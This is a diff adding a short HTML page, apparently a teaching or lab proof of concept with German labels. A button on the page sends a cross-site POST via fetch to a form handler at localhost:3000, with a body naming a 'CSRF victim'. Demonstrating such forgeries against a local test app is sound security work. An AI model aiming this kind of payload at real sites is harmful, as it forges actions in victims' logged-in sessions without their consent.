@@ -1,0 +1,12 @@
+<!doctype html>
+<meta charset="utf-8">
+<button id="send">Sende CSRF-POST</button>
+<script>
+document.getElementById('send').onclick = () => {
+  fetch('http://localhost:3000/submit', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+    body: 'name=CSRF-Opfer'
+  }).then(() => console.log('Request abgeschickt')).catch(console.error);
+};
+</script>
